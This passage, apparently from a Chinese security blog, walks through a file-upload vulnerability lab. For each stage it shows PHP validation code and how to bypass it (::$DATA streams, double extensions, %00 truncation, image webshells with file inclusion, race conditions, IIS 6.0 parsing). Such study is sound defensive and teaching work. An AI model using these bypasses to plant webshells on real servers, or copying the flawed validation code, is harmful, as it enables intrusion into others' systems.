array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.date(\"YmdHis\").rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有对后缀名进行去”::$DATA”处理 ，如果上传的文件名字为：test.php::$DATA，会在服务器上生成一个test.php的文件，其中内容和所上传文件内容相同，并被解析 上传 Test.php:a.jpg 生成Test.php 文件内容为空上传 Test.php::$DATA 生成test.php 文件内容为&lt;?php phpinfo();?&gt;上传 Test.php::$INDEX_ALLOCATION 生成test.php文件夹上传 Test.php::$DATA\\0.jpg 生成0.jpg 文件内容为&lt;?php phpinfo();?&gt;上传 Test.php::$DATA\\aaa.jpg 生成aaa.jpg 文件内容为&lt;?php phpinfo();?&gt;PS: 上传test.php:a.jpg的时候其实是在服务器上正常生成了一个数据流文件，可以通过notepad test.php:a.jpg查看内容，而test.php为空也是正常的。 绕过方法： 上传文件后缀加 ::$DATA 文件上传——文件名加. .绕过后端代码： $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\".php\",\".php5\",\".php4\",\".php3\",\".php2\",\".html\",\".htm\",\".phtml\",\".pht\",\".pHp\",\".pHp5\",\".pHp4\",\".pHp3\",\".pHp2\",\".Html\",\".Htm\",\".pHtml\",\".jsp\",\".jspa\",\".jspx\",\".jsw\",\".jsv\",\".jspf\",\".jtml\",\".jSp\",\".jSpx\",\".jSpa\",\".jSw\",\".jSv\",\".jSpf\",\".jHtml\",\".asp\",\".aspx\",\".asa\",\".asax\",\".ascx\",\".ashx\",\".asmx\",\".cer\",\".aSp\",\".aSpx\",\".aSa\",\".aSax\",\".aScx\",\".aShx\",\".aSmx\",\".cEr\",\".sWf\",\".swf\",\".htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = deldot($file_name);//删除文件名末尾的点 $file_ext = strrchr($file_name, '.'); $file_ext = strtolower($file_ext); //转换为小写 $file_ext = str_ireplace('::$DATA', '', $file_ext);//去除字符串::$DATA $file_ext = trim($file_ext); //首尾去空 if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; &#125; else &#123; $msg = '此文件类型不允许上传！'; &#125; 绕过原理： 程序没有匹配完全 只删除文件名末尾的 . 绕过方法： 上传文件后缀加. . 文件上传——文件名双写绕过 后端代码 $is_upload = false;$msg = null;if (isset($_POST['submit'])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(\"php\",\"php5\",\"php4\",\"php3\",\"php2\",\"html\",\"htm\",\"phtml\",\"pht\",\"jsp\",\"jspa\",\"jspx\",\"jsw\",\"jsv\",\"jspf\",\"jtml\",\"asp\",\"aspx\",\"asa\",\"asax\",\"ascx\",\"ashx\",\"asmx\",\"cer\",\"swf\",\"htaccess\"); $file_name = trim($_FILES['upload_file']['name']); $file_name = str_ireplace($deny_ext,\"\", $file_name); $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = UPLOAD_PATH.'/'.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; 绕过原理： 程序仅仅对黑名单内的后缀名进行字符替换，且没有预处理只替换一次 绕过方法： 上传文件的文件后缀名双写可进行绕过检测 文件上传——%00截断绕过(GET) 后端代码 $is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_GET['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = '上传出错！'; &#125; 绕过原理： 程序使用白名单限制，通过拼接路径和文件名来进行存储 且 拼接的路径和文件名均可变 绕过方法： 路径处进行%00截断绕过 文件上传——%00截断绕过(POST) 后端代码 $is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_ext = substr($_FILES['upload_file']['name'],strrpos($_FILES['upload_file']['name'],\".\")+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $img_path = $_POST['save_path'].\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传失败\"; &#125; &#125; else &#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; &#125;&#125; 绕过原理： 大部分跟上面的相似，但POST传输的数据（%00）不可以自动解析进行截断 绕过方法： burp自带hex编码，将php后面的一组数改为00 文件上传——简单的上传图片马进行绕过（利用文件包含漏洞） 后端代码： function getReailFileType($filename)&#123; $file = fopen($filename, \"rb\"); $bin = fread($file, 2); //只读2字节 fclose($file); $strInfo = @unpack(\"C2chars\", $bin); $typeCode = intval($strInfo['chars1'].$strInfo['chars2']); $fileType = ''; switch($typeCode)&#123; case 255216: $fileType = 'jpg'; break; case 13780: $fileType = 'png'; break; case 7173: $fileType = 'gif'; break; default: $fileType = 'unknown'; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $temp_file = $_FILES['upload_file']['tmp_name']; $file_type = getReailFileType($temp_file); if($file_type == 'unknown')&#123; $msg = \"文件未知，上传失败！\"; &#125;else&#123; $img_path = UPLOAD_PATH.\"/\".rand(10, 99).date(\"YmdHis\").\".\".$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;&#125; 绕过原理： 文件包含漏洞在加载文件时统一解析为该服务器所处理的脚本文件 绕过方法： http://*.*.*.*/upload.php?file=xiaoma.jpg (访问上传的小马文件即可，相对路径) 文件上传——二次渲染绕过（利用文件包含漏洞） 后端代码 &lt;?phpinclude '../config.php';include '../head.php';include '../menu.php';$is_upload = false;$msg = null;if (isset($_POST['submit']))&#123; // 获得上传文件的基本信息，文件名，类型，大小，临时文件路径 $filename = $_FILES['upload_file']['name']; $filetype = $_FILES['upload_file']['type']; $tmpname = $_FILES['upload_file']['tmp_name']; $target_path=UPLOAD_PATH.'/'.basename($filename); // 获得上传文件的扩展名 $fileext= substr(strrchr($filename,\".\"),1); //判断文件后缀与类型，合法才进行上传操作 if(($fileext == \"jpg\") &amp;&amp; ($filetype==\"image/jpeg\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromjpeg($target_path); if($im == false)&#123; $msg = \"该文件不是jpg格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".jpg\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagejpeg($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"png\") &amp;&amp; ($filetype==\"image/png\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefrompng($target_path); if($im == false)&#123; $msg = \"该文件不是png格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".png\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagepng($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else if(($fileext == \"gif\") &amp;&amp; ($filetype==\"image/gif\"))&#123; if(move_uploaded_file($tmpname,$target_path))&#123; //使用上传的图片生成新的图片 $im = imagecreatefromgif($target_path); if($im == false)&#123; $msg = \"该文件不是gif格式的图片！\"; @unlink($target_path); &#125;else&#123; //给新图片指定文件名 srand(time()); $newfilename = strval(rand()).\".gif\"; //显示二次渲染后的图片（使用用户上传图片生成的新图片） $img_path = UPLOAD_PATH.'/'.$newfilename; imagegif($im,$img_path); @unlink($target_path); $is_upload = true; &#125; &#125; else &#123; $msg = \"上传出错！\"; &#125; &#125;else&#123; $msg = \"只允许上传后缀为.jpg|.png|.gif的图片文件！\"; &#125;&#125;?&gt; 绕过原理： 源文件与上传文件虽然会进行二次渲染，但分析后呢 两个文件仍会有相同的16进制编码部分 绕过方法： 生成一个普通的gif文件（文件尽量大一些容易找到相同编码的部分） 将最初的图片文件命名为test.gif 上传后的图片命名为test2.gif 利用010Editor将两图片进行比较，找到相同的部分 在蓝色部分随便挑选一个位置写入 上传修改文件后利用文件包含漏洞进行访问 文件上传——条件竞争绕过 后端代码 $is_upload = false;$msg = null;if(isset($_POST['submit']))&#123; $ext_arr = array('jpg','png','gif'); $file_name = $_FILES['upload_file']['name']; $temp_file = $_FILES['upload_file']['tmp_name']; $file_ext = substr($file_name,strrpos($file_name,\".\")+1); $upload_file = UPLOAD_PATH . '/' . $file_name; if(move_uploaded_file($temp_file, $upload_file))&#123; if(in_array($file_ext,$ext_arr))&#123; $img_path = UPLOAD_PATH . '/'. rand(10, 99).date(\"YmdHis\").\".\".$file_ext; rename($upload_file, $img_path); $is_upload = true; &#125;else&#123; $msg = \"只允许上传.jpg|.png|.gif类型文件！\"; unlink($upload_file); &#125; 绕过原理： 这里先将文件上传到服务器，然后通过rename修改名称，再通过unlink删除文件，因此可以通过条件竞争的方式在unlink之前，访问webshell。 绕过方法: 利用burp抓到上传文件的数据包进行循环发送 构造上传路径进行循环访问（http://*.*.*.*/upload/php.php）,步骤与上述相同 访问大量上传包中的最大包 文件上传——IIS 6/0 解析漏洞导致上传绕过这里是代码，只有聪明的人才看得见（谁知道我写完之后自己也看不见了） 科普一下IIS解析漏洞： IIS6.0解析漏洞分两种1、目录解析以*.asp命名的文件夹里的文件都将会被当成ASP文件执行。2、文件解析*.asp;.jpg 像这种畸形文件名在“；”后面的直接被忽略，也就是说当成 *.asp文件执行。IIS6.0 默认的可执行文件除了asp还包含这三种 *.asa *.cer *.cdx","categories":[{"name":"各类漏洞收集整理","slug":"各类漏洞收集整理","permalink":"https://13l00m.github.io/categories/%E5%90%84%E7%B1%BB%E6%BC%8F%E6%B4%9E%E6%94%B6%E9%9B%86%E6%95%B4%E7%90%86/"}],"tags":[{"name":"php","slug":"php","permalink":"https://13l00m.github.io/tags/php/"},{"name":"web安全","slug":"web安全","permalink":"https://13l00m.github.io/tags/web%E5%AE%89%E5%85%A8/"},{"name":"文件上传","slug":"文件上传","permalink":"https://13l00m.github.io/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"}]}]}